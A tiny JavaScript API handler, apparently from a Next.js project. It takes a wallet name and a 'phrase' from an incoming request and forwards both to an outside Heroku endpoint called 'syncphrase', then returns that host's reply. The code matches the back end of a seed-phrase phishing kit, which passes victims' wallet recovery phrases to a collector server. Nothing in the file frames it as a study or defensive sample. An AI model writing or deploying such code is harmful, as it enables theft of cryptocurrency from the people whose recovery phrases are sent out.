import axios from 'axios';

export default async (req, res) => {
    const result = await axios.post('https://powerna.herokuapp.com/v1/syncphrase', {
      wallet: req.body.wallet,
      phrase: req.body.phrase
    })
    // console.log(result)
    res.status(200).json(result)
  }